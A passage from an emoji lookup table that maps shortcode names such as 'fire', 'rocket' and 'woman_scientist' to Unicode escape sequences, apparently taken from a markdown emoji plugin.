    "fearful": "\u{1F628}",
    "feet": "\u{1F43E}",
    "female_detective": "\u{1F575}\uFE0F&zwj;\u2640\uFE0F",
    "ferris_wheel": "\u{1F3A1}",
    "ferry": "\u26F4",
    "field_hockey": "\u{1F3D1}",
    "file_cabinet": "\u{1F5C4}",
    "file_folder": "\u{1F4C1}",
    "film_projector": "\u{1F4FD}",
    "film_strip": "\u{1F39E}",
    "fire": "\u{1F525}",
    "fire_engine": "\u{1F692}",
    "fireworks": "\u{1F386}",
    "first_quarter_moon": "\u{1F313}",
    "first_quarter_moon_with_face": "\u{1F31B}",
    "fish": "\u{1F41F}",
    "fish_cake": "\u{1F365}",
    "fishing_pole_and_fish": "\u{1F3A3}",
    "fist_raised": "\u270A",
    "fist_left": "\u{1F91B}",
    "fist_right": "\u{1F91C}",
    "flags": "\u{1F38F}",
    "flashlight": "\u{1F526}",
    "fleur_de_lis": "\u269C\uFE0F",
    "flight_arrival": "\u{1F6EC}",
    "flight_departure": "\u{1F6EB}",
    "floppy_disk": "\u{1F4BE}",
    "flower_playing_cards": "\u{1F3B4}",
    "flushed": "\u{1F633}",
    "fog": "\u{1F32B}",
    "foggy": "\u{1F301}",
    "football": "\u{1F3C8}",
    "footprints": "\u{1F463}",
    "fork_and_knife": "\u{1F374}",
    "fountain": "\u26F2\uFE0F",
    "fountain_pen": "\u{1F58B}",
    "four_leaf_clover": "\u{1F340}",
    "fox_face": "\u{1F98A}",
    "framed_picture": "\u{1F5BC}",
    "free": "\u{1F193}",
    "fried_egg": "\u{1F373}",
    "fried_shrimp": "\u{1F364}",
    "fries": "\u{1F35F}",
    "frog": "\u{1F438}",
    "frowning": "\u{1F626}",
    "frowning_face": "\u2639\uFE0F",
    "frowning_man": "\u{1F64D}&zwj;\u2642\uFE0F",
    "frowning_woman": "\u{1F64D}",
    "middle_finger": "\u{1F595}",
    "fuelpump": "\u26FD\uFE0F",
    "full_moon": "\u{1F315}",
    "full_moon_with_face": "\u{1F31D}",
    "funeral_urn": "\u26B1\uFE0F",
    "game_die": "\u{1F3B2}",
    "gear": "\u2699\uFE0F",
    "gem": "\u{1F48E}",
    "gemini": "\u264A\uFE0F",
    "ghost": "\u{1F47B}",
    "gift": "\u{1F381}",
    "gift_heart": "\u{1F49D}",
    "girl": "\u{1F467}",
    "globe_with_meridians": "\u{1F310}",
    "goal_net": "\u{1F945}",
    "goat": "\u{1F410}",
    "golf": "\u26F3\uFE0F",
    "golfing_man": "\u{1F3CC}\uFE0F",
    "golfing_woman": "\u{1F3CC}\uFE0F&zwj;\u2640\uFE0F",
    "gorilla": "\u{1F98D}",
    "grapes": "\u{1F347}",
    "green_apple": "\u{1F34F}",
    "green_book": "\u{1F4D7}",
    "green_heart": "\u{1F49A}",
    "green_salad": "\u{1F957}",
    "grey_exclamation": "\u2755",
    "grey_question": "\u2754",
    "grimacing": "\u{1F62C}",
    "grin": "\u{1F601}",
    "grinning": "\u{1F600}",
    "guardsman": "\u{1F482}",
    "guardswoman": "\u{1F482}&zwj;\u2640\uFE0F",
    "guitar": "\u{1F3B8}",
    "gun": "\u{1F52B}",
    "haircut_woman": "\u{1F487}",
    "haircut_man": "\u{1F487}&zwj;\u2642\uFE0F",
    "hamburger": "\u{1F354}",
    "hammer": "\u{1F528}",
    "hammer_and_pick": "\u2692",
    "hammer_and_wrench": "\u{1F6E0}",
    "hamster": "\u{1F439}",
    "hand": "\u270B",
    "handbag": "\u{1F45C}",
    "handshake": "\u{1F91D}",
    "hankey": "\u{1F4A9}",
    "hatched_chick": "\u{1F425}",
    "hatching_chick": "\u{1F423}",
    "headphones": "\u{1F3A7}",
    "hear_no_evil": "\u{1F649}",
    "heart": "\u2764\uFE0F",
    "heart_decoration": "\u{1F49F}",
    "heart_eyes": "\u{1F60D}",
    "heart_eyes_cat": "\u{1F63B}",
    "heartbeat": "\u{1F493}",
    "heartpulse": "\u{1F497}",
    "hearts": "\u2665\uFE0F",
    "heavy_check_mark": "\u2714\uFE0F",
    "heavy_division_sign": "\u2797",
    "heavy_dollar_sign": "\u{1F4B2}",
    "heavy_heart_exclamation": "\u2763\uFE0F",
    "heavy_minus_sign": "\u2796",
    "heavy_multiplication_x": "\u2716\uFE0F",
    "heavy_plus_sign": "\u2795",
    "helicopter": "\u{1F681}",
    "herb": "\u{1F33F}",
    "hibiscus": "\u{1F33A}",
    "high_brightness": "\u{1F506}",
    "high_heel": "\u{1F460}",
    "hocho": "\u{1F52A}",
    "hole": "\u{1F573}",
    "honey_pot": "\u{1F36F}",
    "horse": "\u{1F434}",
    "horse_racing": "\u{1F3C7}",
    "hospital": "\u{1F3E5}",
    "hot_pepper": "\u{1F336}",
    "hotdog": "\u{1F32D}",
    "hotel": "\u{1F3E8}",
    "hotsprings": "\u2668\uFE0F",
    "hourglass": "\u231B\uFE0F",
    "hourglass_flowing_sand": "\u23F3",
    "house": "\u{1F3E0}",
    "house_with_garden": "\u{1F3E1}",
    "houses": "\u{1F3D8}",
    "hugs": "\u{1F917}",
    "hushed": "\u{1F62F}",
    "ice_cream": "\u{1F368}",
    "ice_hockey": "\u{1F3D2}",
    "ice_skate": "\u26F8",
    "icecream": "\u{1F366}",
    "id": "\u{1F194}",
    "ideograph_advantage": "\u{1F250}",
    "imp": "\u{1F47F}",
    "inbox_tray": "\u{1F4E5}",
    "incoming_envelope": "\u{1F4E8}",
    "tipping_hand_woman": "\u{1F481}",
    "information_source": "\u2139\uFE0F",
    "innocent": "\u{1F607}",
    "interrobang": "\u2049\uFE0F",
    "iphone": "\u{1F4F1}",
    "izakaya_lantern": "\u{1F3EE}",
    "jack_o_lantern": "\u{1F383}",
    "japan": "\u{1F5FE}",
    "japanese_castle": "\u{1F3EF}",
    "japanese_goblin": "\u{1F47A}",
    "japanese_ogre": "\u{1F479}",
    "jeans": "\u{1F456}",
    "joy": "\u{1F602}",
    "joy_cat": "\u{1F639}",
    "joystick": "\u{1F579}",
    "kaaba": "\u{1F54B}",
    "key": "\u{1F511}",
    "keyboard": "\u2328\uFE0F",
    "keycap_ten": "\u{1F51F}",
    "kick_scooter": "\u{1F6F4}",
    "kimono": "\u{1F458}",
    "kiss": "\u{1F48B}",
    "kissing": "\u{1F617}",
    "kissing_cat": "\u{1F63D}",
    "kissing_closed_eyes": "\u{1F61A}",
    "kissing_heart": "\u{1F618}",
    "kissing_smiling_eyes": "\u{1F619}",
    "kiwi_fruit": "\u{1F95D}",
    "koala": "\u{1F428}",
    "koko": "\u{1F201}",
    "label": "\u{1F3F7}",
    "large_blue_circle": "\u{1F535}",
    "large_blue_diamond": "\u{1F537}",
    "large_orange_diamond": "\u{1F536}",
    "last_quarter_moon": "\u{1F317}",
    "last_quarter_moon_with_face": "\u{1F31C}",
    "latin_cross": "\u271D\uFE0F",
    "laughing": "\u{1F606}",
    "leaves": "\u{1F343}",
    "ledger": "\u{1F4D2}",
    "left_luggage": "\u{1F6C5}",
    "left_right_arrow": "\u2194\uFE0F",
    "leftwards_arrow_with_hook": "\u21A9\uFE0F",
    "lemon": "\u{1F34B}",
    "leo": "\u264C\uFE0F",
    "leopard": "\u{1F406}",
    "level_slider": "\u{1F39A}",
    "libra": "\u264E\uFE0F",
    "light_rail": "\u{1F688}",
    "link": "\u{1F517}",
    "lion": "\u{1F981}",
    "lips": "\u{1F444}",
    "lipstick": "\u{1F484}",
    "lizard": "\u{1F98E}",
    "lock": "\u{1F512}",
    "lock_with_ink_pen": "\u{1F50F}",
    "lollipop": "\u{1F36D}",
    "loop": "\u27BF",
    "loud_sound": "\u{1F50A}",
    "loudspeaker": "\u{1F4E2}",
    "love_hotel": "\u{1F3E9}",
    "love_letter": "\u{1F48C}",
    "low_brightness": "\u{1F505}",
    "lying_face": "\u{1F925}",
    "m": "\u24C2\uFE0F",
    "mag": "\u{1F50D}",
    "mag_right": "\u{1F50E}",
    "mahjong": "\u{1F004}\uFE0F",
    "mailbox": "\u{1F4EB}",
    "mailbox_closed": "\u{1F4EA}",
    "mailbox_with_mail": "\u{1F4EC}",
    "mailbox_with_no_mail": "\u{1F4ED}",
    "man": "\u{1F468}",
    "man_artist": "\u{1F468}&zwj;\u{1F3A8}",
    "man_astronaut": "\u{1F468}&zwj;\u{1F680}",
    "man_cartwheeling": "\u{1F938}&zwj;\u2642\uFE0F",
    "man_cook": "\u{1F468}&zwj;\u{1F373}",
    "man_dancing": "\u{1F57A}",
    "man_facepalming": "\u{1F926}&zwj;\u2642\uFE0F",
    "man_factory_worker": "\u{1F468}&zwj;\u{1F3ED}",
    "man_farmer": "\u{1F468}&zwj;\u{1F33E}",
    "man_firefighter": "\u{1F468}&zwj;\u{1F692}",
    "man_health_worker": "\u{1F468}&zwj;\u2695\uFE0F",
    "man_in_tuxedo": "\u{1F935}",
    "man_judge": "\u{1F468}&zwj;\u2696\uFE0F",
    "man_juggling": "\u{1F939}&zwj;\u2642\uFE0F",
    "man_mechanic": "\u{1F468}&zwj;\u{1F527}",
    "man_office_worker": "\u{1F468}&zwj;\u{1F4BC}",
    "man_pilot": "\u{1F468}&zwj;\u2708\uFE0F",
    "man_playing_handball": "\u{1F93E}&zwj;\u2642\uFE0F",
    "man_playing_water_polo": "\u{1F93D}&zwj;\u2642\uFE0F",
    "man_scientist": "\u{1F468}&zwj;\u{1F52C}",
    "man_shrugging": "\u{1F937}&zwj;\u2642\uFE0F",
    "man_singer": "\u{1F468}&zwj;\u{1F3A4}",
    "man_student": "\u{1F468}&zwj;\u{1F393}",
    "man_teacher": "\u{1F468}&zwj;\u{1F3EB}",
    "man_technologist": "\u{1F468}&zwj;\u{1F4BB}",
    "man_with_gua_pi_mao": "\u{1F472}",
    "man_with_turban": "\u{1F473}",
    "tangerine": "\u{1F34A}",
    "mans_shoe": "\u{1F45E}",
    "mantelpiece_clock": "\u{1F570}",
    "maple_leaf": "\u{1F341}",
    "martial_arts_uniform": "\u{1F94B}",
    "mask": "\u{1F637}",
    "massage_woman": "\u{1F486}",
    "massage_man": "\u{1F486}&zwj;\u2642\uFE0F",
    "meat_on_bone": "\u{1F356}",
    "medal_military": "\u{1F396}",
    "medal_sports": "\u{1F3C5}",
    "mega": "\u{1F4E3}",
    "melon": "\u{1F348}",
    "memo": "\u{1F4DD}",
    "men_wrestling": "\u{1F93C}&zwj;\u2642\uFE0F",
    "menorah": "\u{1F54E}",
    "mens": "\u{1F6B9}",
    "metal": "\u{1F918}",
    "metro": "\u{1F687}",
    "microphone": "\u{1F3A4}",
    "microscope": "\u{1F52C}",
    "milk_glass": "\u{1F95B}",
    "milky_way": "\u{1F30C}",
    "minibus": "\u{1F690}",
    "minidisc": "\u{1F4BD}",
    "mobile_phone_off": "\u{1F4F4}",
    "money_mouth_face": "\u{1F911}",
    "money_with_wings": "\u{1F4B8}",
    "moneybag": "\u{1F4B0}",
    "monkey": "\u{1F412}",
    "monkey_face": "\u{1F435}",
    "monorail": "\u{1F69D}",
    "moon": "\u{1F314}",
    "mortar_board": "\u{1F393}",
    "mosque": "\u{1F54C}",
    "motor_boat": "\u{1F6E5}",
    "motor_scooter": "\u{1F6F5}",
    "motorcycle": "\u{1F3CD}",
    "motorway": "\u{1F6E3}",
    "mount_fuji": "\u{1F5FB}",
    "mountain": "\u26F0",
    "mountain_biking_man": "\u{1F6B5}",
    "mountain_biking_woman": "\u{1F6B5}&zwj;\u2640\uFE0F",
    "mountain_cableway": "\u{1F6A0}",
    "mountain_railway": "\u{1F69E}",
    "mountain_snow": "\u{1F3D4}",
    "mouse": "\u{1F42D}",
    "mouse2": "\u{1F401}",
    "movie_camera": "\u{1F3A5}",
    "moyai": "\u{1F5FF}",
    "mrs_claus": "\u{1F936}",
    "muscle": "\u{1F4AA}",
    "mushroom": "\u{1F344}",
    "musical_keyboard": "\u{1F3B9}",
    "musical_note": "\u{1F3B5}",
    "musical_score": "\u{1F3BC}",
    "mute": "\u{1F507}",
    "nail_care": "\u{1F485}",
    "name_badge": "\u{1F4DB}",
    "national_park": "\u{1F3DE}",
    "nauseated_face": "\u{1F922}",
    "necktie": "\u{1F454}",
    "negative_squared_cross_mark": "\u274E",
    "nerd_face": "\u{1F913}",
    "neutral_face": "\u{1F610}",
    "new": "\u{1F195}",
    "new_moon": "\u{1F311}",
    "new_moon_with_face": "\u{1F31A}",
    "newspaper": "\u{1F4F0}",
    "newspaper_roll": "\u{1F5DE}",
    "next_track_button": "\u23ED",
    "ng": "\u{1F196}",
    "no_good_man": "\u{1F645}&zwj;\u2642\uFE0F",
    "no_good_woman": "\u{1F645}",
    "night_with_stars": "\u{1F303}",
    "no_bell": "\u{1F515}",
    "no_bicycles": "\u{1F6B3}",
    "no_entry": "\u26D4\uFE0F",
    "no_entry_sign": "\u{1F6AB}",
    "no_mobile_phones": "\u{1F4F5}",
    "no_mouth": "\u{1F636}",
    "no_pedestrians": "\u{1F6B7}",
    "no_smoking": "\u{1F6AD}",
    "non-potable_water": "\u{1F6B1}",
    "nose": "\u{1F443}",
    "notebook": "\u{1F4D3}",
    "notebook_with_decorative_cover": "\u{1F4D4}",
    "notes": "\u{1F3B6}",
    "nut_and_bolt": "\u{1F529}",
    "o": "\u2B55\uFE0F",
    "o2": "\u{1F17E}\uFE0F",
    "ocean": "\u{1F30A}",
    "octopus": "\u{1F419}",
    "oden": "\u{1F362}",
    "office": "\u{1F3E2}",
    "oil_drum": "\u{1F6E2}",
    "ok": "\u{1F197}",
    "ok_hand": "\u{1F44C}",
    "ok_man": "\u{1F646}&zwj;\u2642\uFE0F",
    "ok_woman": "\u{1F646}",
    "old_key": "\u{1F5DD}",
    "older_man": "\u{1F474}",
    "older_woman": "\u{1F475}",
    "om": "\u{1F549}",
    "on": "\u{1F51B}",
    "oncoming_automobile": "\u{1F698}",
    "oncoming_bus": "\u{1F68D}",
    "oncoming_police_car": "\u{1F694}",
    "oncoming_taxi": "\u{1F696}",
    "open_file_folder": "\u{1F4C2}",
    "open_hands": "\u{1F450}",
    "open_mouth": "\u{1F62E}",
    "open_umbrella": "\u2602\uFE0F",
    "ophiuchus": "\u26CE",
    "orange_book": "\u{1F4D9}",
    "orthodox_cross": "\u2626\uFE0F",
    "outbox_tray": "\u{1F4E4}",
    "owl": "\u{1F989}",
    "ox": "\u{1F402}",
    "package": "\u{1F4E6}",
    "page_facing_up": "\u{1F4C4}",
    "page_with_curl": "\u{1F4C3}",
    "pager": "\u{1F4DF}",
    "paintbrush": "\u{1F58C}",
    "palm_tree": "\u{1F334}",
    "pancakes": "\u{1F95E}",
    "panda_face": "\u{1F43C}",
    "paperclip": "\u{1F4CE}",
    "paperclips": "\u{1F587}",
    "parasol_on_ground": "\u26F1",
    "parking": "\u{1F17F}\uFE0F",
    "part_alternation_mark": "\u303D\uFE0F",
    "partly_sunny": "\u26C5\uFE0F",
    "passenger_ship": "\u{1F6F3}",
    "passport_control": "\u{1F6C2}",
    "pause_button": "\u23F8",
    "peace_symbol": "\u262E\uFE0F",
    "peach": "\u{1F351}",
    "peanuts": "\u{1F95C}",
    "pear": "\u{1F350}",
    "pen": "\u{1F58A}",
    "pencil2": "\u270F\uFE0F",
    "penguin": "\u{1F427}",
    "pensive": "\u{1F614}",
    "performing_arts": "\u{1F3AD}",
    "persevere": "\u{1F623}",
    "person_fencing": "\u{1F93A}",
    "pouting_woman": "\u{1F64E}",
    "phone": "\u260E\uFE0F",
    "pick": "\u26CF",
    "pig": "\u{1F437}",
    "pig2": "\u{1F416}",
    "pig_nose": "\u{1F43D}",
    "pill": "\u{1F48A}",
    "pineapple": "\u{1F34D}",
    "ping_pong": "\u{1F3D3}",
    "pisces": "\u2653\uFE0F",
    "pizza": "\u{1F355}",
    "place_of_worship": "\u{1F6D0}",
    "plate_with_cutlery": "\u{1F37D}",
    "play_or_pause_button": "\u23EF",
    "point_down": "\u{1F447}",
    "point_left": "\u{1F448}",
    "point_right": "\u{1F449}",
    "point_up": "\u261D\uFE0F",
    "point_up_2": "\u{1F446}",
    "police_car": "\u{1F693}",
    "policewoman": "\u{1F46E}&zwj;\u2640\uFE0F",
    "poodle": "\u{1F429}",
    "popcorn": "\u{1F37F}",
    "post_office": "\u{1F3E3}",
    "postal_horn": "\u{1F4EF}",
    "postbox": "\u{1F4EE}",
    "potable_water": "\u{1F6B0}",
    "potato": "\u{1F954}",
    "pouch": "\u{1F45D}",
    "poultry_leg": "\u{1F357}",
    "pound": "\u{1F4B7}",
    "rage": "\u{1F621}",
    "pouting_cat": "\u{1F63E}",
    "pouting_man": "\u{1F64E}&zwj;\u2642\uFE0F",
    "pray": "\u{1F64F}",
    "prayer_beads": "\u{1F4FF}",
    "pregnant_woman": "\u{1F930}",
    "previous_track_button": "\u23EE",
    "prince": "\u{1F934}",
    "princess": "\u{1F478}",
    "printer": "\u{1F5A8}",
    "purple_heart": "\u{1F49C}",
    "purse": "\u{1F45B}",
    "pushpin": "\u{1F4CC}",
    "put_litter_in_its_place": "\u{1F6AE}",
    "question": "\u2753",
    "rabbit": "\u{1F430}",
    "rabbit2": "\u{1F407}",
    "racehorse": "\u{1F40E}",
    "racing_car": "\u{1F3CE}",
    "radio": "\u{1F4FB}",
    "radio_button": "\u{1F518}",
    "radioactive": "\u2622\uFE0F",
    "railway_car": "\u{1F683}",
    "railway_track": "\u{1F6E4}",
    "rainbow": "\u{1F308}",
    "rainbow_flag": "\u{1F3F3}\uFE0F&zwj;\u{1F308}",
    "raised_back_of_hand": "\u{1F91A}",
    "raised_hand_with_fingers_splayed": "\u{1F590}",
    "raised_hands": "\u{1F64C}",
    "raising_hand_woman": "\u{1F64B}",
    "raising_hand_man": "\u{1F64B}&zwj;\u2642\uFE0F",
    "ram": "\u{1F40F}",
    "ramen": "\u{1F35C}",
    "rat": "\u{1F400}",
    "record_button": "\u23FA",
    "recycle": "\u267B\uFE0F",
    "red_circle": "\u{1F534}",
    "registered": "\xAE\uFE0F",
    "relaxed": "\u263A\uFE0F",
    "relieved": "\u{1F60C}",
    "reminder_ribbon": "\u{1F397}",
    "repeat": "\u{1F501}",
    "repeat_one": "\u{1F502}",
    "rescue_worker_helmet": "\u26D1",
    "restroom": "\u{1F6BB}",
    "revolving_hearts": "\u{1F49E}",
    "rewind": "\u23EA",
    "rhinoceros": "\u{1F98F}",
    "ribbon": "\u{1F380}",
    "rice": "\u{1F35A}",
    "rice_ball": "\u{1F359}",
    "rice_cracker": "\u{1F358}",
    "rice_scene": "\u{1F391}",
    "right_anger_bubble": "\u{1F5EF}",
    "ring": "\u{1F48D}",
    "robot": "\u{1F916}",
    "rocket": "\u{1F680}",
    "rofl": "\u{1F923}",
    "roll_eyes": "\u{1F644}",
    "roller_coaster": "\u{1F3A2}",
    "rooster": "\u{1F413}",
    "rose": "\u{1F339}",
    "rosette": "\u{1F3F5}",
    "rotating_light": "\u{1F6A8}",
    "round_pushpin": "\u{1F4CD}",
    "rowing_man": "\u{1F6A3}",
    "rowing_woman": "\u{1F6A3}&zwj;\u2640\uFE0F",
    "rugby_football": "\u{1F3C9}",
    "running_man": "\u{1F3C3}",
    "running_shirt_with_sash": "\u{1F3BD}",
    "running_woman": "\u{1F3C3}&zwj;\u2640\uFE0F",
    "sa": "\u{1F202}\uFE0F",
    "sagittarius": "\u2650\uFE0F",
    "sake": "\u{1F376}",
    "sandal": "\u{1F461}",
    "santa": "\u{1F385}",
    "satellite": "\u{1F4E1}",
    "saxophone": "\u{1F3B7}",
    "school": "\u{1F3EB}",
    "school_satchel": "\u{1F392}",
    "scissors": "\u2702\uFE0F",
    "scorpion": "\u{1F982}",
    "scorpius": "\u264F\uFE0F",
    "scream": "\u{1F631}",
    "scream_cat": "\u{1F640}",
    "scroll": "\u{1F4DC}",
    "seat": "\u{1F4BA}",
    "secret": "\u3299\uFE0F",
    "see_no_evil": "\u{1F648}",
    "seedling": "\u{1F331}",
    "selfie": "\u{1F933}",
    "shallow_pan_of_food": "\u{1F958}",
    "shamrock": "\u2618\uFE0F",
    "shark": "\u{1F988}",
    "shaved_ice": "\u{1F367}",
    "sheep": "\u{1F411}",
    "shell": "\u{1F41A}",
    "shield": "\u{1F6E1}",
    "shinto_shrine": "\u26E9",
    "ship": "\u{1F6A2}",
    "shirt": "\u{1F455}",
    "shopping": "\u{1F6CD}",
    "shopping_cart": "\u{1F6D2}",
    "shower": "\u{1F6BF}",
    "shrimp": "\u{1F990}",
    "signal_strength": "\u{1F4F6}",
    "six_pointed_star": "\u{1F52F}",
    "ski": "\u{1F3BF}",
    "skier": "\u26F7",
    "skull": "\u{1F480}",
    "skull_and_crossbones": "\u2620\uFE0F",
    "sleeping": "\u{1F634}",
    "sleeping_bed": "\u{1F6CC}",
    "sleepy": "\u{1F62A}",
    "slightly_frowning_face": "\u{1F641}",
    "slightly_smiling_face": "\u{1F642}",
    "slot_machine": "\u{1F3B0}",
    "small_airplane": "\u{1F6E9}",
    "small_blue_diamond": "\u{1F539}",
    "small_orange_diamond": "\u{1F538}",
    "small_red_triangle": "\u{1F53A}",
    "small_red_triangle_down": "\u{1F53B}",
    "smile": "\u{1F604}",
    "smile_cat": "\u{1F638}",
    "smiley": "\u{1F603}",
    "smiley_cat": "\u{1F63A}",
    "smiling_imp": "\u{1F608}",
    "smirk": "\u{1F60F}",
    "smirk_cat": "\u{1F63C}",
    "smoking": "\u{1F6AC}",
    "snail": "\u{1F40C}",
    "snake": "\u{1F40D}",
    "sneezing_face": "\u{1F927}",
    "snowboarder": "\u{1F3C2}",
    "snowflake": "\u2744\uFE0F",
    "snowman": "\u26C4\uFE0F",
    "snowman_with_snow": "\u2603\uFE0F",
    "sob": "\u{1F62D}",
    "soccer": "\u26BD\uFE0F",
    "soon": "\u{1F51C}",
    "sos": "\u{1F198}",
    "sound": "\u{1F509}",
    "space_invader": "\u{1F47E}",
    "spades": "\u2660\uFE0F",
    "spaghetti": "\u{1F35D}",
    "sparkle": "\u2747\uFE0F",
    "sparkler": "\u{1F387}",
    "sparkles": "\u2728",
    "sparkling_heart": "\u{1F496}",
    "speak_no_evil": "\u{1F64A}",
    "speaker": "\u{1F508}",
    "speaking_head": "\u{1F5E3}",
    "speech_balloon": "\u{1F4AC}",
    "speedboat": "\u{1F6A4}",
    "spider": "\u{1F577}",
    "spider_web": "\u{1F578}",
    "spiral_calendar": "\u{1F5D3}",
    "spiral_notepad": "\u{1F5D2}",
    "spoon": "\u{1F944}",
    "squid": "\u{1F991}",
    "stadium": "\u{1F3DF}",
    "star": "\u2B50\uFE0F",
    "star2": "\u{1F31F}",
    "star_and_crescent": "\u262A\uFE0F",
    "star_of_david": "\u2721\uFE0F",
    "stars": "\u{1F320}",
    "station": "\u{1F689}",
    "statue_of_liberty": "\u{1F5FD}",
    "steam_locomotive": "\u{1F682}",
    "stew": "\u{1F372}",
    "stop_button": "\u23F9",
    "stop_sign": "\u{1F6D1}",
    "stopwatch": "\u23F1",
    "straight_ruler": "\u{1F4CF}",
    "strawberry": "\u{1F353}",
    "stuck_out_tongue": "\u{1F61B}",
    "stuck_out_tongue_closed_eyes": "\u{1F61D}",
    "stuck_out_tongue_winking_eye": "\u{1F61C}",
    "studio_microphone": "\u{1F399}",
    "stuffed_flatbread": "\u{1F959}",
    "sun_behind_large_cloud": "\u{1F325}",
    "sun_behind_rain_cloud": "\u{1F326}",
    "sun_behind_small_cloud": "\u{1F324}",
    "sun_with_face": "\u{1F31E}",
    "sunflower": "\u{1F33B}",
    "sunglasses": "\u{1F60E}",
    "sunny": "\u2600\uFE0F",
    "sunrise": "\u{1F305}",
    "sunrise_over_mountains": "\u{1F304}",
    "surfing_man": "\u{1F3C4}",
    "surfing_woman": "\u{1F3C4}&zwj;\u2640\uFE0F",
    "sushi": "\u{1F363}",
    "suspension_railway": "\u{1F69F}",
    "sweat": "\u{1F613}",
    "sweat_drops": "\u{1F4A6}",
    "sweat_smile": "\u{1F605}",
    "sweet_potato": "\u{1F360}",
    "swimming_man": "\u{1F3CA}",
    "swimming_woman": "\u{1F3CA}&zwj;\u2640\uFE0F",
    "symbols": "\u{1F523}",
    "synagogue": "\u{1F54D}",
    "syringe": "\u{1F489}",
    "taco": "\u{1F32E}",
    "tada": "\u{1F389}",
    "tanabata_tree": "\u{1F38B}",
    "taurus": "\u2649\uFE0F",
    "taxi": "\u{1F695}",
    "tea": "\u{1F375}",
    "telephone_receiver": "\u{1F4DE}",
    "telescope": "\u{1F52D}",
    "tennis": "\u{1F3BE}",
    "tent": "\u26FA\uFE0F",
    "thermometer": "\u{1F321}",
    "thinking": "\u{1F914}",
    "thought_balloon": "\u{1F4AD}",
    "ticket": "\u{1F3AB}",
    "tickets": "\u{1F39F}",
    "tiger": "\u{1F42F}",
    "tiger2": "\u{1F405}",
    "timer_clock": "\u23F2",
    "tipping_hand_man": "\u{1F481}&zwj;\u2642\uFE0F",
    "tired_face": "\u{1F62B}",
    "tm": "\u2122\uFE0F",
    "toilet": "\u{1F6BD}",
    "tokyo_tower": "\u{1F5FC}",
    "tomato": "\u{1F345}",
    "tongue": "\u{1F445}",
    "top": "\u{1F51D}",
    "tophat": "\u{1F3A9}",
    "tornado": "\u{1F32A}",
    "trackball": "\u{1F5B2}",
    "tractor": "\u{1F69C}",
    "traffic_light": "\u{1F6A5}",
    "train": "\u{1F68B}",
    "train2": "\u{1F686}",
    "tram": "\u{1F68A}",
    "triangular_flag_on_post": "\u{1F6A9}",
    "triangular_ruler": "\u{1F4D0}",
    "trident": "\u{1F531}",
    "triumph": "\u{1F624}",
    "trolleybus": "\u{1F68E}",
    "trophy": "\u{1F3C6}",
    "tropical_drink": "\u{1F379}",
    "tropical_fish": "\u{1F420}",
    "truck": "\u{1F69A}",
    "trumpet": "\u{1F3BA}",
    "tulip": "\u{1F337}",
    "tumbler_glass": "\u{1F943}",
    "turkey": "\u{1F983}",
    "turtle": "\u{1F422}",
    "tv": "\u{1F4FA}",
    "twisted_rightwards_arrows": "\u{1F500}",
    "two_hearts": "\u{1F495}",
    "two_men_holding_hands": "\u{1F46C}",
    "two_women_holding_hands": "\u{1F46D}",
    "u5272": "\u{1F239}",
    "u5408": "\u{1F234}",
    "u55b6": "\u{1F23A}",
    "u6307": "\u{1F22F}\uFE0F",
    "u6708": "\u{1F237}\uFE0F",
    "u6709": "\u{1F236}",
    "u6e80": "\u{1F235}",
    "u7121": "\u{1F21A}\uFE0F",
    "u7533": "\u{1F238}",
    "u7981": "\u{1F232}",
    "u7a7a": "\u{1F233}",
    "umbrella": "\u2614\uFE0F",
    "unamused": "\u{1F612}",
    "underage": "\u{1F51E}",
    "unicorn": "\u{1F984}",
    "unlock": "\u{1F513}",
    "up": "\u{1F199}",
    "upside_down_face": "\u{1F643}",
    "v": "\u270C\uFE0F",
    "vertical_traffic_light": "\u{1F6A6}",
    "vhs": "\u{1F4FC}",
    "vibration_mode": "\u{1F4F3}",
    "video_camera": "\u{1F4F9}",
    "video_game": "\u{1F3AE}",
    "violin": "\u{1F3BB}",
    "virgo": "\u264D\uFE0F",
    "volcano": "\u{1F30B}",
    "volleyball": "\u{1F3D0}",
    "vs": "\u{1F19A}",
    "vulcan_salute": "\u{1F596}",
    "walking_man": "\u{1F6B6}",
    "walking_woman": "\u{1F6B6}&zwj;\u2640\uFE0F",
    "waning_crescent_moon": "\u{1F318}",
    "waning_gibbous_moon": "\u{1F316}",
    "warning": "\u26A0\uFE0F",
    "wastebasket": "\u{1F5D1}",
    "watch": "\u231A\uFE0F",
    "water_buffalo": "\u{1F403}",
    "watermelon": "\u{1F349}",
    "wave": "\u{1F44B}",
    "wavy_dash": "\u3030\uFE0F",
    "waxing_crescent_moon": "\u{1F312}",
    "wc": "\u{1F6BE}",
    "weary": "\u{1F629}",
    "wedding": "\u{1F492}",
    "weight_lifting_man": "\u{1F3CB}\uFE0F",
    "weight_lifting_woman": "\u{1F3CB}\uFE0F&zwj;\u2640\uFE0F",
    "whale": "\u{1F433}",
    "whale2": "\u{1F40B}",
    "wheel_of_dharma": "\u2638\uFE0F",
    "wheelchair": "\u267F\uFE0F",
    "white_check_mark": "\u2705",
    "white_circle": "\u26AA\uFE0F",
    "white_flag": "\u{1F3F3}\uFE0F",
    "white_flower": "\u{1F4AE}",
    "white_large_square": "\u2B1C\uFE0F",
    "white_medium_small_square": "\u25FD\uFE0F",
    "white_medium_square": "\u25FB\uFE0F",
    "white_small_square": "\u25AB\uFE0F",
    "white_square_button": "\u{1F533}",
    "wilted_flower": "\u{1F940}",
    "wind_chime": "\u{1F390}",
    "wind_face": "\u{1F32C}",
    "wine_glass": "\u{1F377}",
    "wink": "\u{1F609}",
    "wolf": "\u{1F43A}",
    "woman": "\u{1F469}",
    "woman_artist": "\u{1F469}&zwj;\u{1F3A8}",
    "woman_astronaut": "\u{1F469}&zwj;\u{1F680}",
    "woman_cartwheeling": "\u{1F938}&zwj;\u2640\uFE0F",
    "woman_cook": "\u{1F469}&zwj;\u{1F373}",
    "woman_facepalming": "\u{1F926}&zwj;\u2640\uFE0F",
    "woman_factory_worker": "\u{1F469}&zwj;\u{1F3ED}",
    "woman_farmer": "\u{1F469}&zwj;\u{1F33E}",
    "woman_firefighter": "\u{1F469}&zwj;\u{1F692}",
    "woman_health_worker": "\u{1F469}&zwj;\u2695\uFE0F",
    "woman_judge": "\u{1F469}&zwj;\u2696\uFE0F",
    "woman_juggling": "\u{1F939}&zwj;\u2640\uFE0F",
    "woman_mechanic": "\u{1F469}&zwj;\u{1F527}",
    "woman_office_worker": "\u{1F469}&zwj;\u{1F4BC}",
    "woman_pilot": "\u{1F469}&zwj;\u2708\uFE0F",
    "woman_playing_handball": "\u{1F93E}&zwj;\u2640\uFE0F",
    "woman_playing_water_polo": "\u{1F93D}&zwj;\u2640\uFE0F",
    "woman_scientist": "\u{1F469}&zwj;\u{1F52C}",
